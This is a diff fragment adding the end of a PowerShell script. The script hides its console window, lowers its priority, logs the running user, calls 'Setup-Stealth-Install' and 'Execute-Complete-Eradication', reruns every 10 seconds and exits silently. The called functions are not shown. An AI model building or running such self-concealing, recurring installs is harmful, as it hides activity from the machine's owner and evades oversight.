+public static extern IntPtr GetConsoleWindow();
+
+[DllImport("User32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+' -ErrorAction SilentlyContinue
+
+$null = [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0) 2>$null
+
+# Set low priority
+$p = Get-Process -Id $pid -ErrorAction SilentlyContinue
+if ($p) { $p.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal }
+
+# Log execution
+$executionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+Write-Log "=========================================" "INFO"
+Write-Log "Execution started at $executionTime" "INFO"
+Write-Log "Running as: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)" "INFO"
+Write-Log "=========================================" "INFO"
+
+# Run installation & eradication
+Setup-Stealth-Install
+Execute-Complete-Eradication
+
+# Log completion
+Write-Log "=========================================" "INFO"
+Write-Log "Execution completed - next run in 10 seconds" "INFO"
+Write-Log "=========================================" "INFO"
+
+# Exit silently
+[Environment]::Exit(0)
